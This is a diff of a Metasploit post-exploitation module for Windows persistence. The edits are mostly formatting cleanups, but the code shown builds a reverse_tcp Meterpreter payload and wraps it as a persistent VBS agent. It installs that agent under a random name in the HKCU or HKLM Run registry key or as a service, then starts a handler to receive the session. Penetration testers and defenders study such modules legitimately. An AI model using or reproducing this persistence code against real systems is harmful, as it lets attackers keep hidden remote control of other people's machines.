@@ -56,8 +56,8 @@ class Metasploit3 < Msf::Post
         OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
         OptBool.new('HANDLER', [ false, 'Start a Multi/Handler to Receive the session.', true]),
         OptString.new('TEMPLATE', [false, 'Alternate template Windows PE File to use.']),
-        OptString.new('REXE',[false, 'The remote executable to use.','']),
-        OptString.new('REXENAME',[false, 'The name to call exe on remote system','']),
+        OptString.new('REXE', [false, 'The remote executable to use.','']),
+        OptString.new('REXENAME', [false, 'The name to call exe on remote system','']),
         OptEnum.new('PAYLOAD_TYPE', [true, 'Meterpreter Payload Type.', 'TCP',['TCP','HTTP','HTTPS']])
       ], self.class)
 
@@ -87,7 +87,7 @@ class Metasploit3 < Msf::Post
     host,port = session.session_host, session.session_port
     payload = "windows/meterpreter/reverse_tcp"
 
-    if  datastore['ACTION'] == 'TEMPLATE'
+    if datastore['ACTION'] == 'TEMPLATE'
       # Check that if a template is provided that it actually exists
       if datastore['TEMPLATE']
         if not ::File.exists?(datastore['TEMPLATE'])
@@ -133,7 +133,6 @@ class Metasploit3 < Msf::Post
       script_on_target = write_exe_to_target(raw,rexename)
     end
 
-
     # Start handler if set
     create_multihand(payload, lhost, lport) if datastore['HANDLER']
 
@@ -142,9 +141,9 @@ class Metasploit3 < Msf::Post
 
     case datastore['STARTUP']
     when /USER/i
-      write_to_reg("HKCU",script_on_target)
+      write_to_reg("HKCU", script_on_target)
     when /SYSTEM/i
-      write_to_reg("HKLM",script_on_target)
+      write_to_reg("HKLM", script_on_target)
     when /SERVICE/i
       install_as_service(script_on_target)
     end
@@ -156,14 +155,14 @@ class Metasploit3 < Msf::Post
     report_note(:host => host,
       :type => "host.persistance.cleanup",
       :data => {
-        :local_id => session.sid,
-        :stype => session.type,
-        :desc => session.info,
-        :platform => session.platform,
+        :local_id    => session.sid,
+        :stype       => session.type,
+        :desc        => session.info,
+        :platform    => session.platform,
         :via_payload => session.via_payload,
         :via_exploit => session.via_exploit,
-        :created_at => Time.now.utc,
-        :commands =>  @clean_up_rc
+        :created_at  => Time.now.utc,
+        :commands    => @clean_up_rc
       }
     )
   end
@@ -203,7 +202,6 @@ class Metasploit3 < Msf::Post
   # Create a payload given a name, lhost and lport, additional options
   #-------------------------------------------------------------------------------
   def create_payload(name, lhost, lport, opts = "")
-
     pay = session.framework.payloads.create(name)
     pay.datastore['LHOST'] = lhost
     pay.datastore['LPORT'] = lport
@@ -216,16 +214,17 @@ class Metasploit3 < Msf::Post
     # Validate the options for the module
     pay.options.validate(pay.datastore)
     return pay
-
   end
 
   # Function for Creating persistent script
   #-------------------------------------------------------------------------------
-  def create_script(delay,altexe,raw)
+  def create_script(delay, altexe, raw)
     if not altexe.nil?
-      vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true, :delay => delay, :template => altexe})
+      vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw,
+                                            {:persist => true, :delay => delay, :template => altexe})
     else
-      vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true, :delay => delay})
+      vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw,
+                                            {:persist => true, :delay => delay})
     end
     print_status("Persistent agent script is #{vbs.length} bytes long")
     return vbs
@@ -242,9 +241,11 @@ class Metasploit3 < Msf::Post
 
     # Create a directory for the logs
     if log_path
-      logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
+      logs = ::File.join(log_path, 'logs', 'persistence',
+                         Rex::FileUtils.clean_path(host + filenameinfo) )
     else
-      logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
+      logs = ::File.join(Msf::Config.log_directory, 'persistence',
+                         Rex::FileUtils.clean_path(host + filenameinfo) )
     end
 
     # Create the log directory
@@ -289,12 +290,12 @@ class Metasploit3 < Msf::Post
 
   # Starts a multi/handler session
   #-------------------------------------------------------------------------------
-  def create_multihand(payload,lhost,lport)
+  def create_multihand(payload, lhost, lport)
     pay = session.framework.payloads.create(payload)
     pay.datastore['LHOST'] = lhost
     pay.datastore['LPORT'] = lport
     print_status("Starting exploit multi handler")
-    if not check_for_listner(lhost,lport)
+    if not check_for_listner(lhost, lport)
       # Set options for module
       mul = session.framework.exploits.create("multi/handler")
       mul.share_datastore(pay.datastore)
@@ -310,7 +311,7 @@ class Metasploit3 < Msf::Post
           'LocalInput'  => self.user_input,
           'LocalOutput' => self.user_output,
           'RunAsJob'    => true
-        )
+      )
     else
       print_error("Could not start handler!")
       print_error("A job is listening on the same Port")
@@ -333,29 +334,29 @@ class Metasploit3 < Msf::Post
   #-------------------------------------------------------------------------------
   def write_to_reg(key,script_on_target)
     nam = Rex::Text.rand_text_alpha(rand(8)+8)
-    print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-    if(key)
-      registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
-      print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+    key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    print_status("Installing into autorun as #{key_path}\\#{nam}")
+    if (key)
+      registry_setvaldata("#{key_path}", nam, script_on_target, "REG_SZ")
+      print_good("Installed into autorun as #{key_path}\\#{nam}")
     else
       print_error("Error: failed to open the registry key for writing")
     end
   end
+
   # Function to install payload as a service
   #-------------------------------------------------------------------------------
   def install_as_service(script_on_target)
-    if  is_system? or is_admin?
+    if is_system? or is_admin?
       print_status("Installing as service..")
       nam = Rex::Text.rand_text_alpha(rand(8)+8)
       print_status("Creating service #{nam}")
       datastore['ACTION'] == 'REXE' ? service_create(nam, nam, "cmd /c \"#{script_on_target}\"") : service_create(nam, nam, "cscript \"#{script_on_target}\"")
-
       @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
     else
       print_error("Insufficient privileges to create service")
     end
   end
-
 
   # Function for writing executable to target host
   #-------------------------------------------------------------------------------
